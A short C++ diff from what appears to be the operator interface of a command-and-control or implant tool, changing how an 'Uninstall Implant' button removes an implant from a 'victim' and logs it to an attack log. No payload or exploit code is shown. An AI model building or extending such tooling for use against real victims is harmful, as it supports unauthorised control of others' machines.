@@ -243,8 +243,9 @@ void drawConnectionsTab(WindowState& state) {
             menuVisible = false;
         }
         if (GuiButton(btn8, "Uninstall Implant")) {
-            if (state.client.sendUninstallCommand(victim.uid)) {
+            if (state.client.uninstallVictim(victim)) {
                 logMan.attack_log(std::format("Uninstalling Implant on Client: {}", victim.uid));
+                selectedRow = -1;
             } else {
                 logMan.local_log("Uninstalling failed!");
             }
